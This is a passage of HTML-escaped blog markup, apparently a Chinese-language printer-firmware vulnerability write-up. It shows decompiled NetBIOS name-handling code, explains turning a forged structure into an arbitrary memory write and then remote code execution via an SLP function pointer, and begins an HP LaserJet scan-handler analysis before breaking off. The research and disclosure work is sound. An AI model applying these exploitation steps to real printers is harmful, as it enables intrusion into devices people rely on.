  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vvv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recv_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dword3C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在初步了解這些結構之後，我們可以先回頭看一下 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndNameProcessExternalMessage&lt;/code&gt;，如果將封包中的 flag 欄位設成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xA801&lt;/code&gt;，將會使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndInternalNameNegativeRegistration&lt;/code&gt; 去處理 NetBIOS name. 該結果將會寫入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter-&amp;gt;responsebuf&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA801&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在 ndInternalNameNegativeRegistration 中:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;returnNegativeRegistrationResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;只要滿足條件就會去 returnNegativeRegistrationResponse 處理 Response，而在 returnNegativeRegistrationResponse 中:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;returnNegativeRegistrationResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+4h] [bp-2Ch] BYREF&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+18h] [bp-18h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+1Ah] [bp-16h] BYREF&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;maybe_memcpy_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED3100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2349&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_40B06FD8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gap0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;responsebuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndGenerateNameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[3]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__rev16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sySendToSocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd_1022&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;logg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2392&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2393&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2396&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2372&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[3]&lt;/code&gt; 會把 response_buf-&amp;gt;id 寫成 nbinfo-&amp;gt;id。&lt;/p&gt;

&lt;p&gt;也就是說，如果我們可以覆蓋掉 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt; 結構，並且構造 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt; 我們就會有一個任意記憶體寫入，而實際上構造方式很簡單，只要找個 Global Buffer 去構造就可以了，我們這邊選擇了 BJNP Session Buffer 去構造我們結構。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而在我們有任意寫入之後，我們可以覆蓋 SLP 的函數指針來達成 RCE，後續利用就與前述相同，這邊就不另外多做介紹了。&lt;/p&gt;

&lt;h3 id=&quot;hp-1&quot;&gt;HP&lt;/h3&gt;

&lt;p&gt;這次目標是 HP Collor LaserJet Pro M479fdw 這台印表機，其主要是 Linux Base 的，分析起來相對單純很多，而其中 Web Service 底下有許多的 cgi 來提供各種不同的印表機操作，這些都是透過 FastCGI 方式來運作，可參考 nginx config 來看每個 path 分別對應到哪個 Port 及哪個 Service&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Sirius/rom/httpmgr_nginx/ledm.conf&lt;/code&gt;
&lt;img src=&quot;/assets/img/blog/20231106/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;/usr/bin/local/slanapp&lt;/strong&gt; 負責處理 scan 相關的操作，主要 listen 在 127.0.0.1:14030&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;當我們存取 /Scan/Jobs 路徑時，就會透過這個 cgi 來處理&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;漏洞位置&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;當 HP 處理 /Scan/Jobs 底下的 get 請求時，會使用 rest_scan_handle_get_request 來處理，同時也會將 pathinfo 一起傳入&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rest_scan_handle_get_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// t1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r7&lt;/span&gt;
